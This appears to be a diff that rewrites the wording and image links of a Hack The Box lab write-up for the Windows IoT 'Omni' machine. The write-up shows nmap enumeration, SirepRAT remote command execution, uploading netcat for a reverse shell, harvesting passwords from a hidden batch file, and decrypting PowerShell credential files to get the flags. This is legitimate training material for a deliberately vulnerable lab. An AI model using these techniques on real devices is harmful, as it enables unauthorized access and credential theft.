@@ -6,14 +6,14 @@ points: 20
 rating: 3.2
 date: 2020-08-22
 avatar: assets/htb/omni.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Omni
 ---
+
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I kicked things off by running nmap against `<YOUR_IP>`. The flags I tend to reach for are: `-p-`, a shorthand telling nmap to cover every port, `-sC`, which is the same as `--script=default` and fires the default set of enumeration scripts at the host, `-sV` for service detection, and `-oA <name>` to write the results out under the base name `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni]
@@ -92,21 +92,21 @@ Nmap done: 1 IP address (1 host up) scanned in 201.47 seconds
            Raw packets sent: 131163 (5.771MB) | Rcvd: 105 (4.816KB)
 ```
 
-There were a few standard Windows ports such as 135 - RPC, 3895 - Windows Remote Management, as well as a web server hosted on port 8080. There were also a few ports in the 29000 range that I did not recognize, including one that was identified by nmap as `ARCserve Discovery`.
+The scan turned up the usual Windows ports like 135 - RPC, 3895 - Windows Remote Management, plus a web server on port 8080. A handful of ports in the 29000 range showed up that I wasn't familiar with, one of which nmap flagged as `ARCserve Discovery`.
 
-I started out my enumeration with the web server on port 8080.
+I began by looking at the web server running on port 8080.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-windows-device-portal.png)
+![](assets/wu/omni/img-1.png)
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-auth-required.png)
+![](assets/wu/omni/img-2.png)
 
-"Windows Device Portal" - Needs credentials to log in
+"Windows Device Portal" - Login requires credentials
 
 [https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf)
 
 > You can login to the Windows Device Portal using the default Administrator credentials \(User name: Administrator, Password: p@ssw0rd\).
 
-unfortunately the owners have changed the default password
+sadly the default password has already been swapped out by the owners
 
 [https://www.thomasmaurer.ch/2015/06/how-to-connect-to-windows-10-iot-core-via-powershell/](https://www.thomasmaurer.ch/2015/06/how-to-connect-to-windows-10-iot-core-via-powershell/)
 
@@ -127,7 +127,7 @@ Password for user <YOUR_IP>\Administrator: ********
 Enter-PSSession: MI_RESULT_ACCESS_DENIED
 ```
 
-denied again...I need to find the password to continue
+denied once more...I'll have to track down the password before I can go further
 
 [https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/](https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/)
 
@@ -173,7 +173,7 @@ Usage example: python SirepRAT.py 192.168.3.17 GetFileFromDevice --remote_path C
 <SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>
 ```
 
-There aren't a lot of useful files that have known locations on a windows machine so I tried to grab the hosts file in `C:\Windows\System32\drivers\etc\`
+Windows doesn't offer many useful files at predictable paths, so I went after the hosts file at `C:\Windows\System32\drivers\etc\`
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
@@ -206,7 +206,7 @@ There aren't a lot of useful files that have known locations on a windows machin
 <FileResult | type: 31, payload length: 824, payload peek: '# Copyright (c) 1993-2009 Microsoft Corp.## Th'>
 ```
 
-Next I had to try running commands to see what privileges I actually had
+My next move was to run some commands and figure out exactly what privileges I held
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
@@ -250,7 +250,7 @@ windir=C:\windows
 <ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
 ```
 
-First I ran the `set` command, which returned a list of the local environment variables
+To start, the `set` command gave me back a dump of the local environment variables
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
@@ -294,7 +294,7 @@ windir=C:\windows
 <ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
 ```
 
-Next I ran the same command to see if there was any difference in using the `--as_logged_on_user` flag. I noticed that there seemed to be a user called "DefaultAccount" logged in
+I then repeated the command with the `--as_logged_on_user` flag to spot any differences. It looked like a user named "DefaultAccount" was the one logged in
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
@@ -309,7 +309,7 @@ C:\windows\system32>
 <OutputStreamResult | type: 11, payload length: 125, payload peek: 'Microsoft Windows [Version 10.0.17763.107]Copyri'>
 ```
 
-My context seems to be running commands as System, so this should be a quick and easy win...right? \(failed to notice this was still "logged on user"\)
+It looked like my commands were executing as System, so this ought to be a fast win...right? \(I missed that this was still "logged on user"\)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
@@ -327,7 +327,7 @@ PS C:\windows\system32>
 <OutputStreamResult | type: 11, payload length: 24, payload peek: 'PS C:\windows\system32> '>
 ```
 
-A little bit of testing shows that I can run PowerShell
+Some quick testing confirms that PowerShell is available to me
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
@@ -349,7 +349,7 @@ At line:1 char:1
 <ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
 ```
 
-wget as an alias is not configured...this may be a limited version of PowerShell
+the `wget` alias isn't set up...this might be a stripped-down build of PowerShell
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
@@ -370,7 +370,7 @@ At line:1 char:1
 <ErrorStreamResult | type: 12, payload length: 4, payload peek: ''>
 ```
 
-so maybe I am not running as System as thought, since I was unable to write to the System32 folder \(the folder I was in by default.\)
+so perhaps I'm not actually running as System after all, given that I couldn't write into the System32 folder \(the directory I landed in by default.\)
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
@@ -392,7 +392,7 @@ Keyboard interrupt received, exiting.
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 ```
 
-Since I could not write to the current folder, I simply made a temp directory and uploaded my nc.exe there
+Because I couldn't write into the current directory, I just created a temp folder and dropped my nc.exe into it
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni/SirepRAT]
@@ -400,7 +400,7 @@ Since I could not write to the current folder, I simply made a temp directory an
 <HResultResult | type: 1, payload length: 4, HResult: 0x0>
 ```
 
-After uploading netcat to the `temp` folder I created I sent a reverse shell back to my machine
+With netcat now sitting in the `temp` folder I'd made, I fired off a reverse shell back to my box
 
 ## Road to User
 
@@ -422,7 +422,7 @@ Atwhoami /allr:1
 PS C:\windows\system32>
 ```
 
-Ok...so my shell is a little shaky...and whoami is not installed
+Alright...the shell is a bit unstable...and there's no whoami binary present
 
 ```text
 PS C:\Windows\system32> ls env:
@@ -464,7 +464,7 @@ USERPROFILE                    C:\Data\Users\System
 windir                         C:\windows
 ```
 
-Since I couldn't use `whoami` I used `ls env:` to once again check the environment variables to see who I was. I seemed to be the user `omni$`.
+With `whoami` unavailable, I fell back on `ls env:` to inspect the environment variables again and identify my user. I appeared to be running as `omni$`.
 
 ```text
 PS C:\Data\Users> ls
@@ -516,7 +516,7 @@ type root.txt
 </Objs>
 ```
 
-I was able to enter the Administrator folder and use `type` to get the contents of the `root.txt` flag, but it did not contain the contents I expected. It seemed to be a PowerShell credential object written to a file.
+I could browse into the Administrator folder and `type` out the `root.txt` flag, but it wasn't what I anticipated. The file held what looked like a serialized PowerShell credential object.
 
 ```text
 PS C:\Data\Users\administrator> type root.txt
@@ -557,12 +557,12 @@ At line:1 char:15
    ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
 ```
 
-I tried importing the credential information to see if I could directly use it, but it gave me a an error message stating that an "Error occurred during a cryptographic operation."
+I attempted to import the credential so I could use it directly, but it threw an error reading "Error occurred during a cryptographic operation."
 
 * [https://social.msdn.microsoft.com/Forums/sqlserver/en-US/cfd1cfd8-cbeb-42eb-b8bd-68f4d8b451f1/convertfromsecurestring-throws-a-cryptographicexception-in-windows-iot?forum=WindowsIoT](https://social.msdn.microsoft.com/Forums/sqlserver/en-US/cfd1cfd8-cbeb-42eb-b8bd-68f4d8b451f1/convertfromsecurestring-throws-a-cryptographicexception-in-windows-iot?forum=WindowsIoT)
 * [https://sodocumentation.net/powershell/topic/2917/handling-secrets-and-credentials](https://sodocumentation.net/powershell/topic/2917/handling-secrets-and-credentials)
 
-AFter doing some reading, it looked like I needed to find a key
+After some reading, it became clear I'd need to locate a key
 
 ```text
 PS C:\Data\Users\administrator> net users
@@ -577,7 +577,7 @@ WDAGUtilityAccount
 The command completed with one or more errors.
 ```
 
-sshd? interesting
+sshd? that's interesting
 
 ```text
 PS C:\Data\Users> cd app
@@ -617,7 +617,7 @@ type user.txt
 </Objs>
 ```
 
-In the folder `C:\Data\Users\app` I found the `user.txt` flag, but it was also encrypted the same way as the `root.txt`.
+Inside `C:\Data\Users\app` I came across the `user.txt` flag, though it was encrypted in the same fashion as `root.txt`.
 
 ```text
 PS C:\Data\Users\app> type hardening.txt
@@ -641,7 +641,7 @@ Path          Owner              Access
 hardening.txt OMNI\Administrator NT AUTHORITY\SYSTEM Deny  Read, Synchronize...
 ```
 
-haha so this file is locked so that it is owned by `Administrator`, but also so `NT AUTHORITY\SYSTEM` cannot read it...very odd
+haha so this file is owned by `Administrator` and locked down so that even `NT AUTHORITY\SYSTEM` is denied read access...quite strange
 
 ```text
 PS C:\Data\Users\app> type iot-admin.xml
@@ -661,7 +661,7 @@ type iot-admin.xml
 </Objs>
 ```
 
-The `iot-admin.xml` file was another PowerShell credential file
+The `iot-admin.xml` turned out to be yet another PowerShell credential file
 
 ```text
 PS C:\Data\Users\app> $credential = Import-CliXml -Path C:\Data\Users\app\iot-admin.xml
@@ -687,7 +687,7 @@ At line:1 char:15
    ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
 ```
 
-I still needed a key to decode these as well it seems
+it looks like I'd still need a key to unlock these too
 
 ```text
 PS C:\Data\Users\DevToolsUser> cd "C:\Program Files"
@@ -727,13 +727,13 @@ d-----       10/26/2018  11:37 PM                Pester
 d-----       10/26/2018  11:37 PM                PowerShellGet
 ```
 
-After poking around in the user folders for a little bit and finding nothing useful, I decided to see what programs were installed. There was only PowerShell with a limited set of modules installed.
+Having dug through the user folders for a while without anything to show for it, I turned my attention to the installed programs. The only thing present was PowerShell, with just a small set of modules.
 
-After searching through the files here I found nothing useful. There was also nothing interesting in netstat or services
+Searching through these files also came up empty. Likewise, netstat and the service list held nothing of interest
 
 ### Finding user creds
 
-After searching for a long time and not finding anything I started searching the user directories and Program Files for hidden files
+After a long stretch of searching with no luck, I began hunting through the user directories and Program Files for hidden files
 
 ```text
 PS C:\Program files\WindowsPowerShell> ls -Recurse -Hidden
@@ -746,7 +746,7 @@ Mode                LastWriteTime         Length Name
 -a-h--        8/21/2020  12:56 PM            247 r.bat
 ```
 
-There were many many hidden files in the users directories, most of them were desktop.ini files and random config files in appdata. However, in the program files directory there was only one hidden file, and it contained some very useful information
+The user directories were full of hidden files, mostly desktop.ini files and assorted config files under appdata. The Program Files directory, though, held just a single hidden file, and it turned out to carry some very valuable information
 
 ```text
 PS C:\Program Files\WindowsPowerShell\Modules\PackageManagement> type r.bat 
@@ -769,7 +769,7 @@ GOTO :LOOP
 :EXIT
 ```
 
-It looked like this batch script contained the passwords for both the `app` user and `administrator`!
+This batch script appeared to hold the passwords for both the `app` user and `administrator`!
 
 [https://davidhamann.de/2019/12/08/running-command-different-user-powershell/](https://davidhamann.de/2019/12/08/running-command-different-user-powershell/)
 
@@ -791,7 +791,7 @@ At line:1 char:1
     + FullyQualifiedErrorId : NotSupported
 ```
 
-hmm it seems like I cannot run commands as another user. I need to find a way to login as the other two users
+hmm it appears I can't execute commands as a different user. I'll need another way to authenticate as one of the other two accounts
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/omni]
@@ -807,43 +807,43 @@ Body:  (404).
 Error: Exiting with code 1
 ```
 
-I tried logging in with WinRM but got an error. Looking at my nmap output again I remembered that there was that web portal I saw earlier
+My WinRM login attempt failed with an error. Revisiting the nmap results, I recalled the web portal I'd noticed earlier
 
 ### Port 8080 - Web Portal
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-loggin-in.png)
+![](assets/wu/omni/img-3.png)
 
-Logged in using `app`'s credentials.
+Authenticated with `app`'s credentials.
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-windows-dive-portal.png)
+![](assets/wu/omni/img-4.png)
 
-Web portal for managing the IOT device
+The web portal used to manage the IOT device
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/5-app-install.png)
+![](assets/wu/omni/img-5.png)
 
-Apps running on the device
+Applications currently running on the device
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/6-interesting-processes.png)
+![](assets/wu/omni/img-6.png)
 
 Running Processes
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-another-password.png)
+![](assets/wu/omni/img-7.png)
 
-Found another password in the AllJoyn SoftAP settings
+Spotted another password within the AllJoyn SoftAP settings
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/7-performance-monitor.png)
+![](assets/wu/omni/img-8.png)
 
-Device performance monitor
+The device performance monitor
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-set-app.png)
+![](assets/wu/omni/img-9.png)
 
-Was able to run commands directly in the portal. Using the command `set` I was able to list all of the currently set environment variables, including the current user context I was running in.
+The portal let me execute commands directly. Running `set` listed every defined environment variable, including the user context my commands were running under.
 
 ## User.txt
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/9-user-flag.png)
+![](assets/wu/omni/img-10.png)
 
-Since I was running as `app` and could execute arbitrary commands I tried again to see if I could decrypt the user.txt flag.
+Now that I was operating as `app` and could run arbitrary commands, I made another attempt at decrypting the user.txt flag.
 
 ```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\app\user.txt; $credential.GetNetworkCredential().Password }
@@ -851,15 +851,15 @@ Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXm
 7cfd************************9d70
 ```
 
-I was able to successfully decrypt the flag!
+The flag decrypted successfully!
 
 ## Further Enumeration
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/10-administrator-logged-in.png)
+![](assets/wu/omni/img-11.png)
 
-next I cleared my cookies for the site, closed and reopened the browser, then logged in as `administrator` to see if the same process could be done for the `root.txt`
+next I wiped the site cookies, restarted the browser, and signed in as `administrator` to check whether the same approach would work for `root.txt`
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/11-hardening-txt.png)
+![](assets/wu/omni/img-12.png)
 
 ```text
 Command> type C:\Data\Users\app\hardening.txt
@@ -871,7 +871,7 @@ Command> type C:\Data\Users\app\hardening.txt
 - removed administrator account from "Ssh Users" group
 ```
 
-Now that I was the administrator user I could read the hardening.txt file which contained the steps the Administrator had taken to hard the machine. I thought it was strange that this file would be locked so only the admin could read it, though it was is the `app` user's folder.
+As the administrator user I could now read hardening.txt, which listed the steps the Administrator had taken to harden the machine. It struck me as odd that this file was restricted to admin-only reads despite sitting in the `app` user's folder.
 
 ```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\app\iot-admin.xml; $credential.GetNetworkCredential().Password }
@@ -905,11 +905,11 @@ At line:1 char:98
     + FullyQualifiedErrorId : InvokeMethodOnNull
 ```
 
-I still wasn't able to decode `iot-admin.xml` for some reason
+for whatever reason, `iot-admin.xml` still wouldn't decode
 
 ## Root.txt
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/12-admin-pwned.png)
+![](assets/wu/omni/img-13.png)
 
 ```text
 Command> powershell.exe Invoke-Command -ScriptBlock { $credential = Import-CliXml -Path C:\Data\Users\administrator\root.txt; $credential.GetNetworkCredential().Password }
